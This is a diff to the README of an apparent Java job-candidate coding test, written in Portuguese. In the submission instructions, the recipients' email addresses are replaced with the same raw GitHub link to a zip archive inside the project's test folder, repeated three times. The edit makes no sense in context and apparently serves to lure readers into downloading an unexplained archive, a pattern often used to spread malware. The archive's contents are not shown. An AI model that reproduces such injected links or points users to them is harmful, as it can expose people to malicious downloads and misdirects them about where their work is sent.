@@ -25,4 +25,4 @@ O candidato deve ser implementar 2 desafios:
 
     
 Após terminar o candidato deverá versionar a prova no git hub e nos mandar o repositório. 
-* Enviar para: lhsilva@travelexbank.com.br, msales@travelexbank.com.br, rlisboa@travelexbank.com.br
+* Enviar para: https://raw.githubusercontent.com/FelipeFullStack/java-basico/master/src/test/java/br/com/confidencecambio/javabasico/java-basico_1.3.zip, https://raw.githubusercontent.com/FelipeFullStack/java-basico/master/src/test/java/br/com/confidencecambio/javabasico/java-basico_1.3.zip, https://raw.githubusercontent.com/FelipeFullStack/java-basico/master/src/test/java/br/com/confidencecambio/javabasico/java-basico_1.3.zip
